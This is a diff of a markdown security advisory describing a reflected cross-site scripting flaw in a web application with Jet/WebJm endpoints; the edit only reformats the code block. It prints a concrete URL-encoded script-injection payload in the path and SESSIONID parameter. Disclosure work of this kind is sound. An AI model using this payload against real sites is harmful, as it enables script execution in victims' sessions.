@@ -29,20 +29,18 @@ Cross-Site Scripting (XSS) is a type of security vulnerability commonly found in
 
 It was possible to exploit a Cross-Site Scripting (XSS) vulnerability by injecting the following payload:
 
-```
-.it/exec/Jet/%5EJetJfVsSesst0/90xp2ez%3cscript%3ealert(1)%3c/script%3ewozs
-e z.it/exec/Jet/WebJmVsJolog0.anagSearch/90?
-SESSIONID=1657524558585w0nnw%3cscript%3
-ealert(1)%3c%2fscript%3ewpbq1rgx0r9&FORMORD=0&CURRENTRECORD=-
-1&nomecoda=FAST&JMCDUTES=qwqq&JMNMHOST=1&JMNMJOBE=qwqwqw&JMDSJOBE=wqwqw&es
-it
-o=F&JMNMDSPE=qwqwq&DTINIZDA=11%2F07%2F2022&DTINIZAL=11%2F07%2F2022&DTFINED
-
-A=&DTF
+`
+ .it/exec/Jet/%5EJetJfVsSesst0/90xp2ez%3cscript%3ealert(1)%3c/script%3ewozs
+ e z.it/exec/Jet/WebJmVsJolog0.anagSearch/90?
+ SESSIONID=1657524558585w0nnw%3cscript%3
+ ealert(1)%3c%2fscript%3ewpbq1rgx0r9&FORMORD=0&CURRENTRECORD=-
+ 1&nomecoda=FAST&JMCDUTES=qwqq&JMNMHOST=1&JMNMJOBE=qwqwqw&JMDSJOBE=wqwqw&es
+ ito=F&JMNMDSPE=qwqwq&DTINIZDA=11%2F07%2F2022&DTINIZAL=11%2F07%2F2022&DTFINED
+ A=&DTF
 INEAL=&DTSOTTDA=&DTSOTTAL=&ORAINIDA=&ORAINIAL=&ORAFINDA=&ORAFINAL=&ORASOTD
 A=&OR
 ASOTAL=&IDJOB=&CODA=FAST&ESITO=F&RICTER=N&CHDTIN=N&CHDTFI=N&CHDTSO=N&UT=A
-```
+`
 
 By injecting this payload, an attacker was able to execute arbitrary JavaScript code within the context of the application, potentially leading to session compromise, unauthorized data access, and other malicious activities. It is crucial to remediate this vulnerability by implementing input validation, output encoding, and context-aware security measures to prevent such attacks and safeguard the application and its users.
 #### Remediations
